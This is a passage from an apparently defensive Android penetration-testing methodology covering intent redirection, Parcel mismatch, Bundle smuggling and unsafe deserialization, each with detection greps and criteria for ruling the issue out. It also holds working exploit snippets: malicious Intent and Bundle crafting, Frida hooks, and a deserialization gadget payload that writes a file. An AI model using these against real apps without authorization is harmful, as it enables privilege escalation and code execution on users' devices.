  evil.setClassName("com.target.app", "com.target.app.internal.AdminActivity");
  evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  Parcel p = Parcel.obtain(); p.writeParcelable(evil, 0);
  Log.i("D08", Base64.encodeToString(p.marshall(), Base64.NO_WRAP));
  ```
  ```bash
  adb shell am start -a android.intent.action.VIEW -d 'myapp://handle/?param=<BASE64>'
  ```
- **Proof:** A browser-triggerable deep link whose base64 parameter unmarshals to an `Intent` targeting a
  non-exported component, and that component launching — `dumpsys activity activities` plus a screenshot.
- **Escalation:** → D16/D17: a malformed `Parcelable` in the same stream is a memory-corruption and
  type-confusion surface, not just a redirection one (see D08-028 and D08-029).
- **Ruled out when:** No `unmarshall(` appears outside framework packages, or the unmarshalled object is
  read with the typed `readParcelable(ClassLoader, Class<T>)` overload **and** the resulting Intent is
  rebuilt from an allow-list rather than launched.

### D08-028 · Untyped `getParcelableExtra` / `getParcelable` / `getSerializableExtra`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | typed overloads exist from **API 33** (Android 13); LEGACY below that — say so explicitly rather than reporting a pre-33 app for not using an API that did not exist |
| **Maps to** | `risks/unsafe-deserialization` — use `Intent.getParcelableExtra(String, Class<T>)`, `Intent.getParcelableArrayListExtra(String, Class<? extends T>)`, `Parcel.readParcelable(ClassLoader, Class<T>)` on API 33+; "catches type mismatches before deserialization, preventing privilege escalation (e.g. CVE-2021-0928)"; michalbednarski/TheLastBundleMismatch — **CVE-2023-45777**, the patch "adds the type parameter to the original call"; MASWE-0050 (CWE-502, CWE-501) |

- **Test:** The legacy untyped overloads instantiate whatever class the Parcel names, using the supplied
  `ClassLoader`, *before* any type check. The typed overloads validate first. On a modern target the
  untyped form keeps the type-confusion surface open, and it is the exact gap CVE-2023-45777 exploited
  against `AccountManagerService.checkKeyIntent()` via `bundle.getParcelable(KEY_INTENT)`.
- **How:**
  ```bash
  grep -rnE 'getParcelableExtra\(\s*[^,)]+\s*\)|getParcelable\(\s*[^,)]+\s*\)|getParcelableArrayList(Extra)?\(\s*[^,)]+\s*\)|getSerializable(Extra)?\(\s*[^,)]+\s*\)|readParcelable\(\s*[^,)]+\s*\)' out/sources/
  # the safe forms name a class:
  grep -rnE 'getParcelable\([^,]+,\s*[A-Za-z.]+::class\.java|IntentCompat\.getParcelableExtra|BundleCompat\.getParcelable|getParcelableExtra\([^,]+,\s*[A-Za-z.]+\.class' out/sources/
  grep -rn 'setClassLoader(\|BadParcelableException' out/sources/
  ```
- **Proof:** Untyped call sites on a Bundle or Intent that originated from an exported component, a
  notification, a widget fill-in or a Wear message — plus a crafted Intent carrying a different Parcelable
  type for that key producing `ClassCastException`/`BadParcelableException` in the target. That exception is
  evidence the class is instantiated *before* the type check.
- **Escalation:** Medium standalone; High when combined with D08-029 (a mismatched class) or when the
  crafted type reaches a class whose `createFromParcel` has side effects. Note the platform lesson from
  CVE-2023-45777: even a typed check helps only if it is applied before the value is used.
- **Ruled out when:** Every read of externally sourced Parcelable/Serializable data uses the typed overload
  or `IntentCompat`/`BundleCompat`, or `minSdkVersion` is below 33 **and** the app additionally validates
  `instanceof` before use — record which.

### D08-029 · App-defined `Parcelable` whose write and read byte counts disagree

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) when the smuggled value defeats an auth check |
| **Attacker** | AM-03 |
| **Applies to** | all; Android 13's length-prefixed `LazyValue` limits *cascading* corruption but, per CVE-2023-45777, does not save code that deserialises without a type |
| **Maps to** | michalbednarski/ReparcelBug2 — **CVE-2021-0928** (`OutputConfiguration` write/read mismatch) with its four detection signs; michalbednarski/LeakValue — **CVE-2022-20452** (LazyValue referencing a recycled Parcel); **CVE-2023-20963** (WorkSource parcel/unparcel mismatch, exploited in the wild per Project Zero's RCA); **CVE-2024-49744**; Bundle Fengshui (Bundle magic `0x4C444E42`, length-prefixed lazy unparcel, AccountManagerService→Settings uid 1000 `launchAnyWhere`, CVE-2017-0806, CVE-2021-0748); `risks/unsafe-deserialization` (CWE-502, CWE-501) |

- **Test:** A `Parcelable` whose `writeToParcel` and `createFromParcel` do not consume the same number of
  bytes lets an attacker hide extra key/value pairs in a `Bundle`: the validating reader sees a benign
  Bundle, a later reader sees additional keys. Against the framework this is `launchAnyWhere`; inside an
  app it is "the Intent that was validated is not the Intent that gets launched".
- **How:** Static triage — the four warning signs are a `catch` in `createFromParcel` that does not
  rethrow, untyped collections via `readList()` without a `ClassLoader` constraint, nested variable-length
  objects, and mismatched field counts:
  ```bash
  grep -rln 'implements Parcelable\|: Parcelable' out/sources/ | while read -r f; do
    w=$(sed -n '/writeToParcel/,/^\s*}/p' "$f" | grep -cE 'write[A-Z][A-Za-z]*\(')
    r=$(sed -n '/createFromParcel/,/^\s*}/p;/protected .*(Parcel/,/^\s*}/p' "$f" | grep -cE 'read[A-Z][A-Za-z]*\(')
    [ "$w" != "$r" ] && echo "MISMATCH $f write=$w read=$r"
  done | tee /tmp/d08_parcel_mismatch.txt
  wc -l /tmp/d08_parcel_mismatch.txt          # count — a silent zero is a failed loop
  grep -rn 'createFromParcel' out/sources/ -A25 | grep -nE 'catch\s*\(|readList\(|readParcelable\(|readBundle\(|readSerializable\('
  ```
  Differential instrumentation:
  ```javascript
  Java.perform(function () {
    var C  = Java.use("com.target.app.model.Thing");
    var CR = Java.use("com.target.app.model.Thing$1");
    C.writeToParcel.implementation = function (p, f) {
      var a = p.dataPosition(); this.writeToParcel(p, f);
      console.log("write delta=" + (p.dataPosition() - a));
    };
    CR.createFromParcel.overload('android.os.Parcel').implementation = function (p) {
      var a = p.dataPosition(); var r = this.createFromParcel(p);
      console.log("read  delta=" + (p.dataPosition() - a)); return r;
    };
  });
  ```
- **Proof:** Unequal write/read deltas for the same object, then a crafted `Bundle` where the validating
  code path logs key set `{a}` while the downstream component logs `{a, injected}`. Print both key sets
  side by side.
- **Escalation:** The app-context payoff is forwarding a forged `Intent` past a check — D08-007 with the
  validation defeated. Generalised rule to test: **any Bundle that is validated in one place and used in
  another**.
- **Ruled out when:** Every app-defined `Parcelable` has matching write/read counts (or a measured zero
  `dataPosition()` drift in the harness), no `createFromParcel` swallows exceptions, and no externally
  sourced Bundle is forwarded after validation.

### D08-030 · Whole-`Bundle` forward carrying smuggled `IBinder` / `PendingIntent` keys

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | AOSP "AIDL overview" (objects packed onto a buffer and copied to the remote process); Bundle Fengshui analysis of AccountManagerService forwarding a Bundle to Settings (uid 1000) which then executed Intents inside it — the `launchAnyWhere` pattern; `risks/unsafe-deserialization` |

- **Test:** A `Bundle` can carry live `IBinder` handles (`putBinder`) and `PendingIntent` objects. An app
  that receives a Bundle from an untrusted source, inspects only the keys it expects, and then forwards the
  **whole Bundle** to a more privileged component is handing over whatever else is inside it — a live
  capability crossing a trust boundary.
- **How:**
  ```bash
  grep -rnE 'getExtras\(\)|putExtras\(|getBundleExtra|putBinder|getBinder' out/sources/ -A8 \
    | grep -B4 -A6 -E 'startActivity|startService|sendBroadcast|\.send\(|bindService'
  ```
  From the stub, craft a Bundle with unexpected keys:
  ```java
  Bundle b = new Bundle();
  b.putString("expected_key", "benign");
  b.putBinder("smuggled_binder", myLiveBinder);
  b.putParcelable("smuggled_pi", myPendingIntent);
  b.putParcelable("android.intent.extra.INTENT", innerEvilIntent);
  outer.putExtras(b);
  ```
  Then hook the downstream component:
  ```javascript
  Java.perform(function () {
    var A = Java.use('com.target.app.internal.Privileged');
    A.onCreate.overload('android.os.Bundle').implementation = function (s) {
      var i = this.getIntent();
      console.log('keys=' + i.getExtras().keySet().toString());
      console.log('binder=' + i.getExtras().getBinder('smuggled_binder'));
      return this.onCreate(s);
    };
  });
  ```
- **Proof:** The Frida hook on the downstream component printing your smuggled key and a non-null
  `getBinder()` — a live capability transferred across the boundary the app believed it was policing.
- **Escalation:** → D06 (you now hold a binder into a privileged component); → D08-029 (the same forwarding
  path is the precondition for the Parcel-mismatch attack); → D08-037 if a `PendingIntent` rode along.
- **Ruled out when:** Every forward constructs a fresh `Bundle`/`Intent` and copies only named keys of
  known types, and no `putExtras(Bundle)` or `putExtras(Intent)` appears on a path whose source is
  external.

### D08-031 · Parcel mismatch across the app's own `android:process` boundary

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | any app declaring `android:process` or using multiprocess WorkManager |
| **Maps to** | michalbednarski/ReparcelBug2 (**CVE-2021-0928**) and TheLastBundleMismatch (**CVE-2023-45777**) applied to an app's own IPC rather than the framework's |

- **Test:** The mismatch class exists because data is validated in one process and re-serialised to
  another. An app with its own process boundary reproduces the system's exact conditions — and nobody
  reviews the app's internal IPC for it.
- **How:**
  ```bash
  grep -n 'android:process' out/AndroidManifest.merged.xml
  grep -rn 'androidx.work.multiprocess\|RemoteListenableWorker\|RemoteWorkManager' out/sources/ out/AndroidManifest.merged.xml
  grep -rln 'implements Parcelable' out/sources/ | xargs grep -ln 'catch'
  ```
  Then instrument both sides of the boundary and compare the decoded object.
- **Proof:** A `Bundle` that validates in the entry process but decodes to a different object in the worker
  process — `Parcel.dataPosition()` drift plus a differing `getClass()` on each side, printed from both
  processes.
- **Escalation:** Validation bypass across the app's own trust boundary, then D08-007 with the check
  defeated.
- **Ruled out when:** The manifest declares no `android:process` and no multiprocess WorkManager, so there
  is no in-app re-serialisation boundary for the mismatch to cross.

### D08-032 · Untyped `getSerializableExtra` on an exported forwarder

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); with a demonstrated gadget, `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | `targetSdk < 33` is where the untyped getters are the default idiom; from API 33 the typed `getSerializableExtra(String, Class)` exists and its absence at a hit is the finding |
| **Maps to** | `risks/unsafe-deserialization` (CVE-2014-7911 `ObjectInputStream`/Android < 5.0, look-ahead `ObjectInputFilter` mitigation); rule `mastg-android-object-deserialization`; MASWE-0050 (CWE-502) |

- **Test:** An exported component that deserialises an object it does not type-check instantiates
  attacker-chosen classes from the app's own classpath, and `readObject()` overrides in the app's or its
  dependencies' classes run as side effects. In this domain it matters because the deserialised object is
  frequently the thing that drives the forward.
- **How:**
  ```bash
  grep -rnE 'getSerializableExtra\(|readSerializable\(|ObjectInputStream|readObject\(' out/sources/ | grep -v test
  grep -rn 'implements Serializable' out/sources/ | wc -l
  grep -rn -A10 'private void readObject' out/sources/       # gadget candidates inside the app
  grep -rn 'setObjectInputFilter' out/sources/               # the mitigation; absence is the gap
  ```
  Build the payload by loading the target's own `classes.dex` in the stub:
  ```java
  DexClassLoader dcl = new DexClassLoader(targetApkPath, getCacheDir().getAbsolutePath(), null, getClassLoader());
  Class<?> g = dcl.loadClass("com.target.app.SomeGadget");
  Object o = g.newInstance();
  Field f = g.getDeclaredField("path"); f.setAccessible(true);
  f.set(o, "/data/data/com.target.app/files/pwn");
  Intent i = new Intent().setClassName("com.target.app", "com.target.app.ExportedActivity");
  i.putExtra("so", (Serializable) o);
  startActivity(i);
  ```
- **Proof:** The gadget's `readObject()` side effect observable — a file created at the path you set
  (`adb shell run-as com.target.app ls -l files/` on a debuggable build), or logic executing on
  attacker-chosen field values. A `ClassCastException` in logcat proves the object was instantiated before
  the type check.
- **Escalation:** → D17 for the gadget hunt and the write→code-load chain. Report RCE only with a
  demonstrated gadget; otherwise state "logic forgery" and keep it at Medium.
- **Ruled out when:** Every `getSerializableExtra` uses the typed overload, or no exported component
  deserialises at all, or the app ships an `ObjectInputFilter` allow-list on the path.
